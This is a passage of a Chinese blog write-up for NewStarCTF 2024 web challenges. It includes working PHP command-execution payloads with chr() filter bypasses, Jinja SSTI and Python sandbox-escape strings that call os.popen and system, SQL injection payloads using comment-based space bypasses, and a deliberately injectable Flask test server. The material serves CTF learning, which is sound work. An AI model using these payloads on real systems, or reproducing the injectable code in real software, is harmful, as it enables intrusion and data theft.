<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;http://eci-2ze1p9tw7xzx0ganthsl.cloudeci1.ichunqiu.com&quot;</span></span><br><span class="line"></span><br><span class="line">START = <span class="string">&quot;/start&quot;</span></span><br><span class="line">SUBMIT = <span class="string">&quot;/submit&quot;</span></span><br><span class="line"></span><br><span class="line">client = httpx.Client()</span><br><span class="line">paragraph_pattern = <span class="string">r&quot;&lt;p id=\&quot;text\&quot;&gt;([^&lt;]*)&lt;/p&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the challenge</span></span><br><span class="line">response = client.get(HOST + START)</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;(not empty)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> result:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = re.findall(paragraph_pattern, response.text)</span><br><span class="line">        response = client.post(HOST + SUBMIT, data=&#123;<span class="string">&quot;user_input&quot;</span>: result[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就能得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Code_oTQiHJCeGI.png"></p>
<h3 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h3><blockquote>
<p>题目内容：</p>
<p>我的拉链找不到了 你可以帮我找找吗</p>
<p>【难度：简单】</p>
</blockquote>
<p>题目说了拉链这个关键词，所以想到网站目录下的zip文件，尝试下载<code>www.zip</code>发现可以下载，得到网站源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Bandizip.x64_4ApsHwhoW2.png"></p>
<p>看到里面有个<code>pizwww.php</code>，打开是个源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//for fun</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&#123;</span><br><span class="line">        <span class="comment">//欸 为啥sha1和md5相等呢</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;u can not do this &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求query参数<code>new</code>的sha1值跟POST请求体重star的md5值相等，且两者自身不相等，而sha1和md5两种加密方式的长度本身就不相等，MD5的长度是32，而sha1是40，所以只能使用数组绕过，即传入数组，使得两个加密的结果均为<code>null</code>（下图为本地调试）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/gyQKDvJJEe.png"></p>
<p>上面告诉我们不准我们用<code>cat</code>和<code>flag</code>（不区分大小写），所以我们要用别的方式，例如用chr函数，写个脚本构造payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Command: &quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> command:</span><br><span class="line">        <span class="keyword">if</span> payload:</span><br><span class="line">            payload += <span class="string">f&quot;.chr(<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>)&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span>, payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就可以直接用这个脚本帮我构建payload了</p>
<div class="note warning flat"><p>这里有个坑，我一开始传入的时候，用单引号包裹了我的chr链，导致chr不能正确运行，传入的时候并不需要包裹引号</p>
</div>

<p>我传入<code>echo shell_exec(&#39;find / -iname &quot;flag&quot;&#39;);</code>，payload写作<code>echo%20shell_exec(chr(102).chr(105).chr(110).chr(100).chr(32).chr(47).chr(32).chr(45).chr(105).chr(110).chr(97).chr(109).chr(101).chr(32).chr(34).chr(102).chr(108).chr(97).chr(103).chr(34));</code>，可以得到flag的位置为<code>/flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_DbN5zWTwck.png"></p>
<p>接着要传入<code>echo shell_exec(&#39;cat /flag&#39;);</code>，payload写作<code>echo%20shell_exec(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103));</code>，然后就能够读取到flag为<code>flag&#123;55fe44c0-c359-44ef-a820-aa7d125633bf&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_M4Qn5xKN8U.png"></p>
<h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><blockquote>
<p>你知道 人类的本质是……</p>
<p>【难度：困难】</p>
</blockquote>
<p>这题因为叫复读机，所以我首先怀疑是SSTI，试了一下还真是</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_w3RX1RZyDM.png"></p>
<p>试着传入<code>&#123;&#123;system('ls')&#125;&#125;</code>，但是报500错误了，应该是没有<code>from os import system</code>，但是确认了确实存在SSTI，接下来就是抄作业环节，直接去找现成的payload，传入<code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39; )</code>，结果回复机器人讨厌上课(class)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_3ZBpJZimvz.png"></p>
<p>说明了这题对<code>class</code>这个关键词做了过滤，我们就找找绕过<code>class</code>的payload，尝试传入<code>&#123;&#123;""["__cla""ss__"]&#125;&#125;</code>，发现能正常使用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_yZtIrOAQLe.png"></p>
<p>但是我尝试使用同样的方式绕过<code>__subclass__</code>，发现不行，所以换种思路</p>
<p>这时我看到了这篇文章 &#x3D;&gt; <a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">SSTI进阶 | 沉铝汤的破站 (chenlvtang.top)</a></p>
<p>通过文章的方法可以实现绕过，我先传入<code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('find / -iname flag').read()")&#125;&#125;</code>，发现了flag的位置为<code>/flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_GIjC5v9cXF.png"></p>
<p>然后读出来就行了，传入<code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code>，得到flag为<code>flag&#123;9c71f48c-19a5-47a9-9903-89d2a7c3688a&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_9Fqt8G0AfS.png"></p>
<h3 id="PangBai-过家家（2）（未做出）"><a href="#PangBai-过家家（2）（未做出）" class="headerlink" title="PangBai 过家家（2）（未做出）"></a>PangBai 过家家（2）（未做出）</h3><blockquote>
<p>PangBai 已经成为了我最亲的亲人，我将她反锁在房间内，随后照常去心理医院上班，但回来后却发现我的定居点被泄露了，我谨慎地走进房间，却发现后门开着，近处躺着倒下的 PangBai ——凶手从后门攻击了她，并带走了我的重要资料。我只身前往应战，并托蓬蓬头将 PangBai 送至医院。</p>
<p>【难度：中等】</p>
</blockquote>
<p>与Git泄露有关，没弄出来，建议看官方wp</p>
<h3 id="谢谢皮蛋-plus（未做出）"><a href="#谢谢皮蛋-plus（未做出）" class="headerlink" title="谢谢皮蛋 plus（未做出）"></a>谢谢皮蛋 plus（未做出）</h3><blockquote>
<p>题目内容：</p>
<p>UR！POWERLESS！</p>
<p>【难度：中等】</p>
</blockquote>
<p>尝试用上次用的Payload，但是被Kay&#x2F;O沉默了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/HllpyMgutD.png"></p>
<p>先确定什么东西被过滤了，我先试了一下<code>id=base64(1=)</code>，发现可以正常通过，说明等号没有过滤</p>
<p>再尝试<code>id=base64(1 1)</code>，发现弹<code>U R Powerless</code>，说明空格被过滤了</p>
<p>尝试<code>id=base64(1/**/UNION)</code>，发现可以正常通过，说明<code>UNION</code>没有被过滤</p>
<p>尝试<code>id=base64(1,1)</code>，发现可以正常通过，说明逗号<code>,</code>没有被过滤</p>
<p>尝试<code>id=base64(1()1)</code>，发现可以正常通过，说明<code>()</code>没有被过滤</p>
<p>尝试<code>id=base64(1/**/1.1)</code>，发现可以正常通过，说明<code>.</code>没有被过滤</p>
<p>（以上省略众多测试过程）</p>
<p>经过尝试，发现空格被过滤了，常用的逗号、小括号、点、<code>SELECT</code>、<code>WHERE</code>、<code>-</code>没有被过滤</p>
<p>所以初步判断是空格过滤，空格过滤可以用<code>/**/</code>来代替空格（就像上面我测试使用的那样）</p>
<p>初步构造payload：<code>id=base64(1/**/UNION/**/SELECT/**/TABLE_NAME,/**/TABLE_NAME/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA/**/=/**/database();/**/--)</code>发现可以通过，但是也只是处理了一个结果，所以把1改为其他的数字（我改成10），即变成<code>id=base64(10/**/UNION/**/SELECT/**/TABLE_NAME,/**/TABLE_NAME/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA/**/=/**/database();/**/--)</code>，发现没有回显，应该是报错了</p>
<p>在本地写了个测试用的服务器去测试</p>
<details class="toggle" ><summary class="toggle-button" style="">本地服务器代码</summary><div class="toggle-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="keyword">from</span> mysql.connector <span class="keyword">import</span> Error</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_connection</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        connection = mysql.connector.connect(</span><br><span class="line">            host=<span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">            user=<span class="string">&quot;root&quot;</span>,</span><br><span class="line">            password=<span class="string">&quot;password&quot;</span>,</span><br><span class="line">            port=<span class="number">3306</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> connection.is_connected():</span><br><span class="line">            <span class="keyword">return</span> connection</span><br><span class="line">    <span class="keyword">except</span> Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error while connecting to MySQL: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_database</span>():</span><br><span class="line">    connection = create_connection()</span><br><span class="line">    <span class="keyword">if</span> connection:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor = connection.cursor()</span><br><span class="line">            cursor.execute(<span class="string">&quot;CREATE DATABASE IF NOT EXISTS wingman;&quot;</span>)</span><br><span class="line">            cursor.execute(<span class="string">&quot;USE wingman;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            cursor.execute(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS hexo (</span></span><br><span class="line"><span class="string">                id INT AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">                name VARCHAR(255),</span></span><br><span class="line"><span class="string">                pos VARCHAR(255)</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            cursor.execute(<span class="string">&quot;INSERT IGNORE INTO hexo (id, name, pos) VALUES (1, &#x27;Cypher&#x27;, &#x27;Mid&#x27;);&quot;</span>)</span><br><span class="line"></span><br><span class="line">            cursor.execute(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS flag (</span></span><br><span class="line"><span class="string">                id INT AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">                des VARCHAR(255),</span></span><br><span class="line"><span class="string">                value VARCHAR(255)</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            cursor.execute(<span class="string">&quot;INSERT IGNORE INTO flag (id, des, value) VALUES (1, &#x27;test&#x27;, &#x27;flag&#123;test&#125;&#x27;);&quot;</span>)</span><br><span class="line"></span><br><span class="line">            connection.commit()</span><br><span class="line">            cursor.close()</span><br><span class="line">        <span class="keyword">except</span> Error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error during setup: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            connection.close()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/query&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_db</span>():</span><br><span class="line">    user_query = request.args.get(<span class="string">&#x27;query&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_query:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No query provided.&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    connection = create_connection()</span><br><span class="line">    <span class="keyword">if</span> connection:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor = connection.cursor(dictionary=<span class="literal">True</span>)</span><br><span class="line">            cursor.execute(<span class="string">&quot;USE wingman;&quot;</span>)</span><br><span class="line">            cursor.execute(<span class="string">f&quot;SELECT name, pos FROM hexo WHERE id=<span class="subst">&#123;user_query&#125;</span>&quot;</span>)</span><br><span class="line">            result = cursor.fetchall()</span><br><span class="line">            cursor.close()</span><br><span class="line">            <span class="keyword">return</span> jsonify(result), <span class="number">200</span></span><br><span class="line">        <span class="keyword">except</span> Error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            connection.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to connect to database.&quot;</span>&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    setup_database()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</div></details>

<p>发现这个payload会提示<code>1271 (HY000): Illegal mix of collations for operation &#39;UNION&#39;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_nlSx1kcsmy.png"></p>
<p>没遇到过，问问GPT，GPT说是查询结果的不同列有着不兼容的字符集或排序规则（collation），导致 MariaDB&#x2F;MySQL 无法正确处理查询</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_P9jhPh1cvR.png"></p>
<p>所以改一下payload，让它能够统一，即变成了<code>10/**/UNION/**/SELECT/**/TABLE_NAME/**/COLLATE/**/utf8_general_ci,/**/TABLE_NAME/**/COLLATE/**/utf8_general_ci/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA/**/=/**/database();/**/--</code></p>
<p>已知10在它的表格里面没有对应的东西，所以第一个查询是没有输出的，但是第二个查询我发现也没有输出，有可能是用户权限没给够</p>
<p>所以试试上周的payload，直接用<code>10/**/UNION/**/SELECT/**/GROUP_CONCAT(COLUMN_NAME/**/SEPARATOR/**/&quot;,&quot;),/**/GROUP_CONCAT(COLUMN_NAME/**/SEPARATOR/**/&quot;,&quot;)/**/AS/**/combined_info/**/FROM/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA/**/=/**/database()/**/AND/**/TABLE_NAME/**/=/**/&quot;Fl4g&quot;/**/--</code>，发现弹<code>U R Powerless</code>，说明还有过滤的内容</p>
<p>试一下带双引号进去，发现报错了，说明上面没有输出只是因为没有结果，而不是报错了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/6bRRvoEhXf.png"></p>
<p>做到这里，我先综上一下</p>
<ul>
<li>题目过滤了空格，空格可以用<code>/**/</code>代替</li>
<li>题目限制了一个输出，查询语句应该是<code>SELECT (name, pos) FROM &lt;table&gt; WHERE id=&lt;id&gt; LIMIT 0,1;</code></li>
<li>题目使用的是MariaDB</li>
</ul>
<p>结果就是……没做出来……</p>
<h3 id="臭皮踩踩背"><a href="#臭皮踩踩背" class="headerlink" title="臭皮踩踩背"></a>臭皮踩踩背</h3><blockquote>
<p>老爷爷，为了给你踩背，我一定要从这里逃出去！！！</p>
<p>【难度：简单】</p>
</blockquote>
<blockquote>
<p>这真是web题吗……</p>
</blockquote>
<p>nc进去，给了我们一段代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_v9xfwpFHQd.png"></p>
<p>说白了就是<code>__builtin__</code>为空，用不了Python自己的各种函数了，但是留下了一个名为<code>f</code>的函数给我们用，我们直接用函数的全局域做就好了</p>
<p>直接输入<code>f.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).system(&#39;ls&#39;)</code>，可以看到<code>flag</code>就在当前目录下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_fB7Wnns8om.png"></p>
<p>所以把命令改为<code>cat flag</code>，变成<code>f.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).system(&#39;cat flag&#39;)</code>就能出来了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_wbek7EZbje.png"></p>
<p>得到flag为<code>flag&#123;ed808f50-1726-47df-9a8c-4686a72fd94b&#125;</code>，顺路拿下二血</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/QQ_qDjy1c92sQ.png"></p>
<h3 id="Include-Me（未解出）"><a href="#Include-Me（未解出）" class="headerlink" title="Include Me（未解出）"></a>Include Me（未解出）</h3><blockquote>
<p>兄弟包一下</p>
<p>【难度：中等】</p>
</blockquote>
<p>打开了是PHP源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;|\?|php|&gt;|echo|filter|flag|system|file|%|&amp;|=|`|eval/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;me&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;兄弟你别包&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//兄弟你知道了吗？</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;iknow&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">waf</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;me&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;兄弟你好香&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问<code>http://eci-2ze2ynefkfws5k23ymiv.cloudeci1.ichunqiu.com/?iknow&amp;phpinfo</code>，给<code>phpinfo</code>的query参数，看看服务端开启了什么伪协议，搜索<code>Registered PHP Streams</code>，可以看到服务端开启了<code>https</code>，<code>ftps</code>，<code>compress.zlib</code>，<code>php</code>，<code>file</code>，<code>glob</code>，<code>data</code>，<code>http</code>，<code>ftp</code>，<code>phar</code>伪协议，搞了半天没出来，跑！</p>
<h3 id="臭皮的计算机"><a href="#臭皮的计算机" class="headerlink" title="臭皮的计算机"></a>臭皮的计算机</h3><blockquote>
<p>豌豆送给了臭皮一个特制计算机，你能帮助臭皮找到豌豆的秘密吗？</p>
<p>【难度：中等】</p>
</blockquote>
<p>进来让我们访问<code>/calc</code>目录，然后告诉我们只能够输入数字</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_hM8myfAwx4.png"></p>
<p>根据参考文档，这个是一个Python中eval函数的逃逸，但是仅限输入数字</p>
<p>然而，Python中的八进制是以<code>\</code>开头的，也就是说我可以尝试输入<code>\</code>开头表示的一串内部变量试试，我先尝试了<code>\137\137\142\165\151\154\164\151\156\163\137\137</code>（<code>__builtins__</code>），可以看到正常识别了</p>
